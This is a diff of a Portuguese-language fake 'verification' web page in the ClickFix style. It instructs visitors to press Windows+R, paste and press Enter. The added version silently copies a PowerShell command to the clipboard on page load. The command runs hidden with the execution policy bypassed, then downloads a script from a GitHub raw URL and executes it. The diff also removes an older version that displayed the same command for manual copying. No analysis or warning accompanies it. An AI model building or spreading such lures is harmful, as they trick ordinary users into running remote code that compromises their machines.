@@ -1,217 +1,101 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificação</title>
     <style>
-        /* Importando fontes do Google */
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Montserrat:wght@500;600;700&display=swap');
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background-color: #f0f2f5;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0;
+            background: #f0f0f0;
         }
-
         .box {
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 30px 35px;
-            max-width: 580px;
-            width: 100%;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
-            border: 1px solid #e8e8e8;
-        }
-
-        .title {
-            font-size: 24px;
-            font-weight: 600;
-            color: #2d9c3e;
-            text-align: center;
-            margin-bottom: 10px;
-            font-family: 'Montserrat', sans-serif;
-            letter-spacing: 1px;
-        }
-
-        .subtitle {
-            font-size: 15px;
-            color: #555;
-            font-weight: 400;
-            text-align: center;
-            margin-bottom: 14px;
-            font-family: 'Inter', sans-serif;
-            letter-spacing: 0.3px;
-        }
-
-        .steps {
-            list-style: none;
-            padding: 0;
-            margin: 8px 0 10px 0;
-        }
-
-        .steps li {
-            font-size: 14px;
-            color: #2a2a2a;
-            padding: 5px 0;
-            font-family: 'Inter', sans-serif;
-            font-weight: 400;
-            line-height: 1.6;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .steps li .number {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: #4facfe;
-            color: #ffffff;
-            font-weight: 500;
-            font-size: 13px;
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            flex-shrink: 0;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .steps li .text {
-            flex: 1;
-        }
-
-        .steps li .highlight {
-            color: #4facfe;
-            font-weight: 500;
-        }
-
-        .command-box {
-            background: #1e1e1e;
-            color: #d4d4d4;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 13px;
-            padding: 14px 18px;
+            background: white;
+            padding: 40px;
             border-radius: 8px;
-            margin: 8px 0 14px 0;
-            word-break: break-all;
-            line-height: 1.6;
-            border: 1px solid #333;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            text-align: center;
         }
-
-        .btn-wrapper {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0 5px 0;
+        h2 {
+            margin-top: 0;
+            color: #333;
         }
-
+        .step {
+            text-align: left;
+            margin: 15px 0;
+            padding: 10px;
+            background: #f9f9f9;
+            border-radius: 4px;
+        }
+        .step strong {
+            color: #0056b3;
+        }
+        kbd {
+            background: #e8e8e8;
+            padding: 2px 8px;
+            border-radius: 3px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+        }
+        .id {
+            background: #e8f4fd;
+            padding: 12px;
+            border-radius: 4px;
+            margin: 15px 0;
+            border-left: 3px solid #0056b3;
+        }
         .btn {
-            background: #2d9c3e;
-            color: #ffffff;
+            background: #0056b3;
+            color: white;
             border: none;
-            padding: 11px 40px;
-            font-size: 15px;
-            font-weight: 500;
-            border-radius: 6px;
+            padding: 12px 40px;
+            border-radius: 4px;
+            font-size: 16px;
             cursor: pointer;
-            transition: all 0.2s ease;
-            letter-spacing: 1px;
-            font-family: 'Inter', sans-serif;
+            width: 100%;
         }
-
         .btn:hover {
-            background: #238636;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(45, 156, 62, 0.3);
-        }
-
-        .btn:active {
-            transform: translateY(0px);
-        }
-
-        /* Responsivo */
-        @media (max-width: 480px) {
-            .box {
-                padding: 20px 18px;
-                margin: 15px;
-            }
-            
-            .title {
-                font-size: 20px;
-            }
-            
-            .steps li {
-                font-size: 13px;
-            }
-            
-            .steps li .number {
-                width: 22px;
-                height: 22px;
-                font-size: 12px;
-            }
-            
-            .command-box {
-                font-size: 11px;
-                padding: 12px 14px;
-            }
-            
-            .btn {
-                padding: 10px 30px;
-                font-size: 14px;
-            }
+            background: #004099;
         }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div class="title">VERIFICAÇÃO</div>
+<div class="box">
+    <h2>VERIFICAÇÃO</h2>
+    <p style="color:#666;">Siga os passos abaixo:</p>
 
-        <div class="subtitle">Siga os passos abaixo:</div>
-
-        <!-- PASSO 1 ACIMA DA CAIXA -->
-        <ul class="steps">
-            <li>
-                <span class="number">1</span>
-                <span class="text">Selecione o texto da caixa, e copie com <span class="highlight">Ctrl + C</span></span>
-            </li>
-        </ul>
-
-        <!-- CAIXA DO POWERSHELL -->
-        <div class="command-box">
-            powershell -w 1 -ep bypass -c "irm raw.githubusercontent.com/advancedvfxio-lgtm/teste/refs/heads/main/hello.ps1|iex"
-        </div>
-
-        <!-- PASSOS 2, 3 E 4 ABAIXO DA CAIXA -->
-        <ul class="steps">
-            <li>
-                <span class="number">2</span>
-                <span class="text">Pressione <span class="highlight">Windows + R</span></span>
-            </li>
-            <li>
-                <span class="number">3</span>
-                <span class="text">Cole com <span class="highlight">Ctrl + V</span></span>
-            </li>
-            <li>
-                <span class="number">4</span>
-                <span class="text">Pressione <span class="highlight">Enter</span></span>
-            </li>
-        </ul>
-
-        <div class="btn-wrapper">
-            <button class="btn">VERIFICADO</button>
-        </div>
-
+    <div class="step">
+        <strong>1.</strong> Pressione <kbd>Windows</kbd> + <kbd>R</kbd>
     </div>
+    <div class="step">
+        <strong>2.</strong> Pressione <kbd>Ctrl</kbd> + <kbd>V</kbd>
+    </div>
+    <div class="step">
+        <strong>3.</strong> Pressione <kbd>Enter</kbd>
+    </div>
+
+    <div class="id">
+        ID: <strong>8253</strong>
+    </div>
+
+    <button class="btn" onclick="verificar()">VERIFICAR</button>
+</div>
+
+<script>
+    // Copia automaticamente ao abrir a página
+    navigator.clipboard.writeText("powershell -w 1 -ep bypass -c "irm raw.githubusercontent.com/advancedvfxio-lgtm/teste/refs/heads/main/hello.ps1|iex"");
+
+    function verificar() {
+        document.querySelector('.btn').textContent = 'VERIFICADO';
+        document.querySelector('.btn').style.background = '#28a745';
+    }
+</script>
 
 </body>
 </html>
